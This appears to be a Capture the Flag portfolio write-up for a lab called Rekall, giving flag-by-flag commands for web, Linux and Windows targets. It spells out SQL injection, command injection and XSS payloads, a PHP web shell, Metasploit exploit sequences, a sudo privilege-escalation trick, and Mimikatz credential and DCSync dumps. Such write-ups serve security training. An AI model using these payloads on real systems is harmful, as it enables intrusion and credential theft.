# Overview

**Security Assessment of Rekall Infrastructure**

Through a Capture the Flag project, I performed a thorough security assessment of Rekall’s web and server infrastructure, uncovering and exploiting critical vulnerabilities in web, Linux, and Windows systems. I exposed flaws in input validation, credential management, and service configurations, gaining unauthorized access and escalating privileges to emulate real-world cyberattacks.

**Summary**

Rekall’s web application contained multiple security flaws, including command injection, SQL injection, local file inclusion, and cross-site scripting. I tested these vulnerabilities by executing controlled injection attacks on the homepage, revealing that existing input validation measures could be bypassed. Weak credentials and exposed login details in the source code further allowed brute-force and SQL injection techniques to gain unauthorized access, including administrator privileges.

The Linux servers hosted by Rekall were critically vulnerable. Through both basic and aggressive Nmap scans, I identified open ports and exploited weakly secured services. Using Metasploit, I successfully gained access to the system, navigated the network laterally, and escalated privileges to simulate a full breach scenario.

Rekall’s Windows servers also exhibited serious security gaps. Leveraging Metasploit, I accessed the system and escalated privileges after acquiring user hashes. These were cracked using John the Ripper, enabling lateral movement across the network and highlighting the risks of poor password hygiene and inadequate system hardening.

# Technical Skills

✅ Penetration Testing (Web Applications & Servers)</br>
✅ Vulnerability Assessment & Exploitation</br>
✅ Command Injection & SQL Injection Attacks</br>
✅ Cross-Site Scripting (XSS)</br>
✅ Brute Force Attack Techniques</br>
✅ Metasploit Framework</br>
✅ Nmap Scanning & Network Enumeration</br>
✅ Password Cracking (John the Ripper)</br>
✅ Windows and Linux Server Security & Privilege Escalation</br>

# Web Application

## Expert

### Flag 13: 

![image](https://github.com/user-attachments/assets/fbc16abf-d720-49ae-b820-9c02eb328abd)
</br>
```shell
192.168.14.35/souvenirs.php?message=CALLUSNOW;system('cat /etc/passwd')

jdka7sk23dd
```

## Advanced

### Flag 7:

![image](https://github.com/user-attachments/assets/d116efc3-3782-4a70-b251-40c18580b1ce)
</br>
```shell
admin

password' OR '1'='1

bcs92sjsk233
```

### Flag 15: 

![image](https://github.com/user-attachments/assets/6e3eb3e4-c97f-4dba-aba2-ebbcc436c4a5)
</br>
```shell
192.168.14.35/disclaimer.php?page=old_disclaimers/disclaimer_1.txt

dksdf7sjd5sg
```

### Flag 12: 

![image](https://github.com/user-attachments/assets/207457c0-ed4f-4ba1-b59c-608f5d0f7c22)
</br>
```shell
username: melina

password: melina

hsk23oncsd
```

### Flag 4: 

![image](https://github.com/user-attachments/assets/617fb66a-eeb7-496b-a09f-9bf9ccb1ea69)
</br>
```shell
nckd97dk6sh2
```

### Flag 14: 

![image](https://github.com/user-attachments/assets/dd799d73-3210-47c3-9dbb-42d7d5979051)
![image](https://github.com/user-attachments/assets/cb850488-67ec-4fb2-9246-00cc30ebc0ff)
![image](https://github.com/user-attachments/assets/f542f248-60f7-4c37-ad32-5f39f429cc29)
![image](https://github.com/user-attachments/assets/5857bf1e-874a-40de-b3bc-f81fe51a0480)
</br>
```shell
dks93jdlsd7dj
```

## Intermediate

### Flag 6: LFI (advanced)

![image](https://github.com/user-attachments/assets/336f1e66-981e-4129-a1e5-c169115de596)
</br>
```shell
ld8skd62hdd
```

### Flag 11:

![image](https://github.com/user-attachments/assets/faa9d0d2-6636-421c-bc07-be95f748ce7b)
</br>
```shell
192.168.14.35 | cat vendors.txt

opshdkasy78s
```

### Flag 2: 

![image](https://github.com/user-attachments/assets/9782ef65-3f2f-4a82-8712-d2fc3a291348)
</br>
```shell
<SCscriptRIPT>alert('flag2')</SCscriptRIPT>

ksdnd99dkas
```

## Easy

### Flag 1: Reflected XSS Payload
![image](https://github.com/user-attachments/assets/601b11ff-c6cb-4bb2-9c31-2e3363eadaea)
</br>
```shell
<script>alert('flag1')</script>

f76sdfkg6sjf
```

### Flag 3: Access the Comments.php page and make a pop-up appear
![image](https://github.com/user-attachments/assets/def2ee3e-d1a6-4b29-8adb-888c0b5e2abb)
</br>
```shell
<script>alert('flag3')</script>

sd7fk1nctx
```

### Flag 5: Local File Inclusion Exploit
![image](https://github.com/user-attachments/assets/9617e7ca-c652-4246-b455-903923f803ab)
</br>
```shell
nano lfi.php.jpg

<?php system($_GET['cmd']); ?>

mmssdi73g
```

### Flag 8:  Login.php page
![image](https://github.com/user-attachments/assets/50ac19c5-5ba6-4a14-ae38-18c857564cac)
</br>
```shell
username: dougquaid

password: kuato

87fsdkf6djf
```

### Flag 9:  Sensitive data exposure
![image](https://github.com/user-attachments/assets/f352e0e9-ed93-44b9-ab03-d82699464f6e)
</br>
```shell
192.168.14.35/robots.txt

dkkdudfkdy23
```

### Flag 10: Command injection
![image](https://github.com/user-attachments/assets/7568663d-0f62-4f12-aed1-be1e0c71debf)
</br>
```shell
192.168.14.35&&cat vendors.txt

ksdnd99dkas
```



# Linux Servers

## Reconnaissance

### Flag 1: 
![image](https://github.com/user-attachments/assets/93f04dc9-ea72-41f1-89aa-cecb1134f9d1)
</br>
```shell
whois totalrekall.xyz

h8s692hskasd
```

### Flag 2: 
![image](https://github.com/user-attachments/assets/e1ba58ac-2a94-4fd1-9e11-d657468a7892)
</br>
```shell
13.248.243.5
76.223.105.230
```

### Flag 3: 
![image](https://github.com/user-attachments/assets/b1e36ae2-fcc4-4df8-a0dd-46d5e34f5afd)
</br>
```shell
s7euwehd
```

## Scanning

### Flag 4: 
![image](https://github.com/user-attachments/assets/e0af27f3-bfd5-4347-bb7f-704f982e3bc2)
</br>
```shell
nmap -sV 192.168.13.0/24

5
```

### Flag 5: 
![image](https://github.com/user-attachments/assets/a80bc39d-7815-4154-82b9-6a4fb9d3bd13)
</br>
```shell
nmap -A 192.168.13.0/24

192.168.13.13
```

### Flag 6: 
![image](https://github.com/user-attachments/assets/12335a62-3ddb-453e-9837-8484fa3439b9)
![image](https://github.com/user-attachments/assets/047cae8e-a15e-43b8-9dfe-bf5b14600a6c)
</br>
```shell
Nessus Advance Scan

97610
```

## Exploit

### Flag 7: 
![image](https://github.com/user-attachments/assets/6382fda5-9f6a-4319-bb29-87a712327d06)
![image](https://github.com/user-attachments/assets/8e054655-615f-4f23-ad22-62baa9d81e43)
![image](https://github.com/user-attachments/assets/e213ccf5-5d3d-40db-9f65-79c22c72f0fe)
</br>
```shell
msfconsole

search tomcat jsp

use 5



set RHOSTS 192.168.13.10

run

cd /root

ls -alt

cat .flag7.txt

8ks6sbhss
```

### Flag 8: 

![image](https://github.com/user-attachments/assets/a385776d-e845-4bb1-8250-b498407bb6a6)
![image](https://github.com/user-attachments/assets/13faad45-49b3-4c05-b8b9-dcd4a10c24d5)
</br>
```shell
msfconsole

search shock

use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOST 192.168.13.11

set TARGETURI /cgi-bin/shockme.cgi

cd /etc

ls -l

cat sudoers

9dnx5shdf5
```

### Flag 9: 

![image](https://github.com/user-attachments/assets/2d74a8a2-dee1-4afb-857e-b4d70755e321)
</br>
```shell
cat passwd

wudks8f7sd
```

## Exploit

### Flag 10: 


![image](https://github.com/user-attachments/assets/dcae3cba-d3ce-4863-9516-6b559ebc9797)
![image](https://github.com/user-attachments/assets/c62f14f0-8ff1-4153-a99f-17f9a81afa29)
</br>
```shell
search apache struts

use exploit/multi/http/struts2_content_type_ognl

set RHOSTS 192.168.13.12

run

cd /root

ls -alt

cat flagisinThisfile.7z

wjasdufsdkg
```

### Flag 11: 

![image](https://github.com/user-attachments/assets/5afb0fdd-2812-4554-ba6e-9dfd3cd34218)
![image](https://github.com/user-attachments/assets/58888177-6a20-4e96-b253-c0201814a902)
</br>
```shell
search drupal rce

use exploit/unix/webapp/drupal_restws_unserialize

options

set LHOST 192.168.13.1

set RHOSTS 192.168.13.13

run

shell

whoami

www-data
```

### Flag 12: 

![image](https://github.com/user-attachments/assets/824d9581-790c-414b-9aec-7f27a9cf88b6)
![image](https://github.com/user-attachments/assets/1cab7176-d426-49eb-b059-ee24301b7994)
</br>
```shell
ssh alice@192.168.13.14

password: alice

sudo -u#-1 find / -type f -iname "*flag*"

sudo -u#-1 cat /root/flag12.txt

d7sdfksdf384
```

# Windows Servers

## Reconnaisance

### Flag 1: 

![image](https://github.com/user-attachments/assets/1fb6f1d4-6a88-4deb-b9dc-5acbe61a84fe)
![image](https://github.com/user-attachments/assets/464deb2b-4c40-4ba8-8831-6a3917bbae2f)
</br>
```shell
github.com/totalrekall

site/xampp.users

trivera: Tanya4life
```

### Flag 2: 

![image](https://github.com/user-attachments/assets/863e1ed6-0b21-47ea-9c38-5f0e264ce375)
![image](https://github.com/user-attachments/assets/a165e32f-93c7-459d-bec6-80aca3778f6b)
</br>
```shell
http://172.22.117.20

http://172.22.117.20/flag.txt

4d7b349705784a518bc876bc2ed6d4f6
```

### Flag 3: 

![image](https://github.com/user-attachments/assets/16da09de-87c7-44b7-a4d9-f3081f3df3bf)
</br>
```shell
ftp 172.22.117.20

Name: Anonymous
Password:

get flag3.txt

exit

cat flag3.txt

89cb548970d44f348bb63622353ae278
```

## Exploitation

### Flag 4: 

![image](https://github.com/user-attachments/assets/b4e8dc4c-1814-4a8e-b888-cf13fbeacdc9)
</br>
```shell
msfconsole

search SLMail

use 0

set RHOSTS 172.22.117.20

set LHOST 172.22.117.100

run

cat flag4.txt

822e3434a10440ad9cc086197819b49d
```

## Post-Exploitation

### Flag 5: 

![image](https://github.com/user-attachments/assets/789a220f-ceb2-431f-ac46-3f8a8a6f5019)
</br>
```shell
shell

schtasks /query /TN flag5 /FO list /v

54fa8cd5c1354adc9214969d716673f5
```

### Flag 6: 

![image](https://github.com/user-attachments/assets/947aeb32-04af-4070-977f-f8c4aeb606ba)
</br>
```shell
load kiwi

lsa_dump_sam

john hash.txt

Computer!
```

### Flag 7: 

![image](https://github.com/user-attachments/assets/75c3fa78-fe12-4e25-a9bd-423ab0a13e1f)
</br>
```shell
shell

cd c:\Users\Public\Documents

type flag7.txt

6fd73e3a2c2740328d57ef32557c2fdc
```

### Flag 8: 

![image](https://github.com/user-attachments/assets/26b7e12d-4e2b-41f4-8e63-6202fca00ec0)
![image](https://github.com/user-attachments/assets/41409440-0f9b-4037-a048-571f1491943c)
![image](https://github.com/user-attachments/assets/d72a6353-acdc-4ebc-97a9-6310edcdced3)
</br>
```shell
load kiwi

kiwi_cmd lsadump::cache

msfconsole

use exploit/windows/smb/psexec

set rhosts 172.22.117.10

set smbuser ADMBob

set smbpass Changeme!

setsmbdomain rekall

set lhost 172.22.117.100

run

shell

net users

ad12fc2ffc1
```

### Flag 10: 

![image](https://github.com/user-attachments/assets/d1b85bc9-324c-45eb-b3ce-202a40dcee36)
</br>
```shell
load kiwi

dcsync_ntlm Administrator

4f0cfd309a1965906fd2ec39dd23d582
```

## Lateral Movement

### Flag 9: 

![image](https://github.com/user-attachments/assets/c667201d-0390-4e22-9b46-a149ad68cf82)
</br>
```shell
cd C:\

type flag9.txt

f7356e02f44c4fe7bf5374ff9bcbf872
```
